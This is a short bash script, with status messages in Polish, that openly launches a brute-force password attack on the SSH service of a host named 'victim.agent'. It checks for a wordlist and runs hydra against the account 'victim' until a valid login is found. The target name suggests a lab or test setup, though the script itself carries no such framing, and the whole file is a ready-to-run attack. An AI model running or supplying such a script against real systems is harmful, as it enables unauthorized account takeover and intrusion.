#!/bin/bash
echo "[*] Rozpoczęcie ataku brute-force na usługę SSH hosta victim.agent..."

WORDLIST="/usr/share/wordlists/passwords.txt"

if [[ ! -f "$WORDLIST" ]]; then
    echo "[!] Lista haseł nie została znaleziona: $WORDLIST"
    exit 1
fi

hydra -l victim -P "$WORDLIST" ssh://victim.agent -t 4 -f

echo "[*] Atak zakończony."